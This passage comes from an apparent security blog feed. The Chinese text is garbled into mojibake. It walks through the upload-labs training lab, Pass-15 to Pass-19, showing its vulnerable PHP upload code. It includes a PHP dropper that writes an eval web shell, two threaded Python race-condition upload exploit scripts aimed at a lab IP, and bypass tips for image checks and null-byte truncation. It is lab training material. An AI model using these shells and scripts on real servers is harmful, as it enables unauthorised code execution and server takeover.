ï¼Œå…³é”®åœ¨äº<code>exif_imagetype()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚æ³¨æ„æ­¤å¤„åªæ£€æµ‹å›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥åœ¨æ­¤å¤„æˆ‘ä»¬åœ¨ä¸Šä¸€é¢˜ä½¿ç”¨çš„æ–¹æ³•ä¾æ—§å¯ä»¥ç”Ÿæ•ˆ</p><p>Like</p><p>JPG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure></p><p>GIF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61</span><br></pre></td></tr></table></figure></p><p>(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)</p><p>PNG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x16-Pass-16"><a href="#0x16-Pass-16" class="headerlink" title="0x16 Pass-16"></a>0x16 Pass-16</h3><p>åˆ†æä»£ç å‘ç°æ­¤å¤„å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“æ¯”å¯¹ï¼Œè¿™é‡Œçš„åŸç†æ˜¯å¯¹æ¯”ä¸¤å¼ ç»è¿‡php-gdåº“è½¬æ¢è¿‡çš„gifå›¾ç‰‡ï¼Œå¦‚æœå…¶ä¸­å­˜åœ¨ç›¸åŒä¹‹å¤„ï¼Œè¿™å°±è¯æ˜è¿™éƒ¨åˆ†å›¾ç‰‡æ•°æ®ä¸ä¼šç»è¿‡è½¬æ¢ã€‚ç„¶åæˆ‘å¯ä»¥æ³¨å…¥ä»£ç åˆ°è¿™éƒ¨åˆ†å›¾ç‰‡æ–‡ä»¶ä¸­ï¼Œæœ€ç»ˆå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>æ­¤å¤„ç»™ä¸€ä¸ªå·²ç»æ„é€ çš„å¥½çš„åŒ…å«<code>&lt;?phpinfo();?&gt;</code>çš„å›¾ç‰‡ï¼Œ<a href="https://pan.baidu.com/s/1xzHZYPHsgsI0V5CNZsGpLQ" target="_blank" rel="noopener">PoC</a>  å¯†ç :o34g</p><h3 id="0x17-Pass-17"><a href="#0x17-Pass-17" class="headerlink" title="0x17 Pass-17"></a>0x17 Pass-17</h3><p>åˆ†æä¸‹ä»£ç å‘ç°å¤šäº†<code>unlink()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯åˆ é™¤æŒ‡å®šæ–‡ä»¶ï¼Œçœ‹åˆ°è¿™ä¸ªåŸºæœ¬å°±å¯ä»¥ç¡®å®šè¿™æ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰å†™shelläº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªphpè„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ç«‹é©¬åˆ æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘çš„è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡åœ¨ä¸Šä¼ æ–‡ä»¶åˆ°åˆ é™¤æ–‡ä»¶è¿™ä¸ªæ—¶é—´æ®µå†…è®¿é—®åˆ°ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä¸€æ—¦æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°äº†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå‘æœåŠ¡å™¨å†™ä¸€ä¸ªshellã€‚åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://172.16.5.129/upload/shell.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-17/index.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            <span class="comment">#os._exit(0)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        hh = hackhttp.hackhttp()</span><br><span class="line">        raw = <span class="string">"""</span></span><br><span class="line"><span class="string">        POST /Pass-17/index.php?action=show_code HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.16.5.129</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://172.16.5.129/Pass-17/index.php?action=show_code</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Length: 413</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="upload_file"; filename="shell.php"</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt;</span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸Šä¼ </span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904--</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        code, head, html, redirect, log = hh.http(<span class="string">'http://172.16.5.129/Pass-17/index.php'</span>, raw=raw)</span><br><span class="line">        print(str(code) + <span class="string">"\r"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åæˆ‘ä»¬è¾¹å¯ä»¥å‘ç°åœ¨ç½‘ç«™uploadsç›®å½•ä¸‹å‡ºç°äº†æˆ‘ä»¬æƒ³è¦çš„info.php<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.10.05.png" alt="image"></p><h3 id="0x18-Pass-18"><a href="#0x18-Pass-18" class="headerlink" title="0x18 Pass-18"></a>0x18 Pass-18</h3><p>åˆ†æä¸‹é¢˜ç›®ï¼Œå‘ç°è¿™ä¸ªè¿‡æ»¤åªèƒ½ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ï¼Œåˆçœ‹äº†apacheç‰ˆæœ¬ï¼Œåº”è¯¥æ˜¯æœ‰ä¸ªè§£ææ¼æ´ã€‚ä½†æ˜¯æ™®é€šä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«é‡å‘½åï¼Œé‡å‘½ååæˆ‘ä»¬å°±æ‰¾ä¸åˆ°æˆ‘ä»¬ä¸Šä¼ çš„shelläº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œè¦è®©æ–‡ä»¶ä¸Šä¼ ä¸”ä¸é‡å‘½åï¼Œé‚£ä¹ˆåªèƒ½é€šè¿‡æ¡ä»¶ç«äº‰æ¥è§£å†³äº†ï¼Œä¿®æ”¹ä¸€ä¸‹ä¸Šé¢˜çš„è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-18/index.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        hh = hackhttp.hackhttp()</span><br><span class="line">        raw = <span class="string">"""</span></span><br><span class="line"><span class="string">POST /Pass-18/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.16.5.129</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://172.16.5.129/Pass-18/index.php?action=show_code</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Length: 352</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="upload_file"; filename="test.php.7Z"</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸Šä¼ </span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121--</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        code, head, html, redirect, log = hh.http(self.uploadUrl, raw=raw)</span><br><span class="line">        print(str(code) + <span class="string">"\r"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªè¦æˆ‘ä»¬è¶³å¤Ÿå¿«ï¼Œæˆ‘ä»¬çš„æœªé‡å‘½åçš„æ–‡ä»¶å°±å¯ä»¥å­˜åœ¨ï¼Œå“ˆå“ˆ<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.35.54.png" alt="image"></p><h3 id="0x19-Pass-19"><a href="#0x19-Pass-19" class="headerlink" title="0x19 Pass-19"></a>0x19 Pass-19</h3><p>åˆ†æäº†ä¸€ä¸‹ä»£ç ï¼Œå‘ç°è¿‡æ»¤çš„è¿˜æ˜¯æŒºä¸¥çš„ï¼Œä½†æ˜¯é‡å‘½åè¿™é‡Œè¿˜æ˜¯æœ‰æ–‡ç« å¯ä»¥åšçš„ï¼Œä½¿ç”¨00æˆªæ–­çš„æ–¹å¼å°±å¥½äº†ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å¤±è´¥ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x20-æ€»ç»“"><a href="#0x20-æ€»ç»“" class="headerlink" title="0x20 æ€»ç»“"></a>0x20 æ€»ç»“</h3><p>bypassæ€è·¯â€“è€ƒè™‘ä¸‰ä¸ªåœ°æ–¹çš„ç‰¹æ€§ï¼šä»£ç ã€å®¹å™¨ã€æ“ä½œç³»ç»Ÿ</p><p>å±å®³â€“getshellã€xss(å¦‚æœæ–‡ä»¶åè¢«å­˜å…¥æ•°æ®åº“çš„è¯ï¼Œå¯ä»¥é€ æˆxss)</p><p>PS:upload-labsçš„GitHubä¸Šå†™çš„æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯çœ‹é€Ÿåº¦ï¼Œæˆ‘æ„Ÿè§‰è¯´çš„ä¸å¥½ï¼Œåº”è¯¥å³é”®çœ‹çœ¼æºç å°±å¥½äº†ï¼Œé€Ÿåº¦è¿™ç§ä¸œè¥¿è°è¯´çš„å‡†å‘¢ã€‚</p><p>æœ€åé™„ä¸€å¼ ä¸Šä¼ æ¼æ´çš„è„‘å›¾<br><img src="http://ok44mzy2k.bkt.clouddn.com/fileupload2.png" alt="image"></p><h3 id="0x21-å‚è€ƒ"><a href="#0x21-å‚è€ƒ" class="headerlink" title="0x21 å‚è€ƒ"></a>0x21 å‚è€ƒ</h3><p><a href="https://www.cnblogs.com/engeng/articles/5948089.html" target="_blank" rel="noopener">https://www.cnblogs.com/engeng/articles/5948089.html</a><br><a href="https://paper.tuisec.win/detail/d511228cd560003" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d511228cd560003</a><br><a href="https://paper.tuisec.win/detail/e5e5fd3a08d8ff7" target="_blank" rel="noopener">https://paper.tuisec.win/detail/e5e5fd3a08d8ff7</a><br><a href="http://www.freebuf.com/vuls/128846.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/128846.html</a><br><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/54086.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h3&gt;&lt;p&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´å¯ä»¥è¯´æ˜¯getshellçš„ä¸€ç§å¥½æ–¹å¼äº†ï¼Œä¹Ÿæ˜¯å¸¸è§æ¼æ´ä¹‹ä¸€ï¼Œæœ¬æ–‡ç»“åˆ&lt;a href=&quot;ht
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF AWDæ¨¡å¼æ”»é˜²Note</title>
    <link href="http://zer0yu.github.io/2018/05/24/ctf-awd-note/"/>
